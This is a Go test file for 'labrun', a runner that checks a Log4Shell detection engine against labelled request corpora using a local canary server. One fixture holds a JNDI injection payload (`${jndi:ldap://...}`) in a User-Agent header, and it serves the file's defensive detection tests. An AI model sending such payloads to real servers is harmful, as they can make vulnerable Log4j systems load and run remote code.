package main

import (
	"bytes"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/TurlaFSB/logshield/internal/lab"
)

const (
	attack = `{"id":"a1","class":"public-sample","source":{"type":"project","ref":"t"},"request":{"method":"GET","target":"/","headers":[["Host","h"],["User-Agent","${jndi:ldap://192.0.2.1/a}"]]},"expect":{"decision":"malicious","rules":["LSH-1001"]}}`
	benign = `{"id":"b1","class":"user-agent","source":{"type":"project","ref":"t"},"request":{"method":"GET","target":"/","headers":[["Host","h"],["User-Agent","curl/8"]]},"expect":{"decision":"clean"}}`
)

func corpusDir(t *testing.T, bypass, benignLine string) string {
	t.Helper()
	d := t.TempDir()
	for name, line := range map[string]string{"bypass": bypass, "benign": benignLine} {
		if err := os.MkdirAll(filepath.Join(d, name), 0o750); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(d, name, name+".jsonl"), []byte(line+"\n"), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	return d
}

func canary(t *testing.T, triggers bool) string {
	t.Helper()
	s := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		it := lab.Item{Source: "x", Raw: "x", Rendered: "x"}
		if triggers && strings.Contains(strings.ToLower(r.UserAgent()), "${jndi:") {
			it.JNDI = []string{"ldap://192.0.2.1/a"}
		}
		_ = json.NewEncoder(w).Encode(lab.CanaryReply{Items: []lab.Item{it}})
	}))
	t.Cleanup(s.Close)
	return strings.TrimPrefix(s.URL, "http://")
}

func TestRun(t *testing.T) {
	out := t.TempDir()
	var so, se bytes.Buffer
	code := run([]string{"-canary", canary(t, true), "-corpus", corpusDir(t, attack, benign), "-out", out, "-label", "unit"}, &so, &se)
	if code != 0 || !strings.Contains(so.String(), "PASS") {
		t.Fatalf("code %d\nstdout: %s\nstderr: %s", code, so.String(), se.String())
	}
	for _, f := range []string{"results.json", "report.md"} {
		if _, err := os.Stat(filepath.Join(out, f)); err != nil {
			t.Errorf("missing %s", f)
		}
	}
	md, _ := os.ReadFile(filepath.Join(out, "report.md"))
	if !strings.Contains(string(md), "**PASS**") || !strings.Contains(string(md), "unit") {
		t.Errorf("report: %s", md)
	}
}

func TestRunFailsOnExpectationDrift(t *testing.T) {
	// The corpus claims the engine says clean, but it says malicious.
	drift := strings.Replace(attack, `"decision":"malicious","rules":["LSH-1001"]`, `"decision":"clean"`, 1)
	var so, se bytes.Buffer
	code := run([]string{"-canary", canary(t, true), "-corpus", corpusDir(t, drift, benign), "-out", t.TempDir()}, &so, &se)
	if code != 1 || !strings.Contains(so.String(), "FAIL") {
		t.Fatalf("want exit 1, got %d: %s", code, so.String())
	}
}

func TestRunUsageErrors(t *testing.T) {
	var so, se bytes.Buffer
	if c := run([]string{"-nope"}, &so, &se); c != 2 {
		t.Errorf("bad flag: %d", c)
	}
	if c := run([]string{"-corpus", t.TempDir()}, &so, &se); c != 2 {
		t.Errorf("empty corpus: %d", c)
	}
	if c := run([]string{"-canary", "127.0.0.1:1", "-corpus", corpusDir(t, attack, benign), "-out", t.TempDir()}, &so, &se); c != 2 {
		t.Errorf("dead canary must stop before sending: %d", c)
	}
	so.Reset()
	if c := run([]string{"-version"}, &so, &se); c != 0 || !strings.HasPrefix(so.String(), "labrun") {
		t.Errorf("version: %d %q", c, so.String())
	}
}
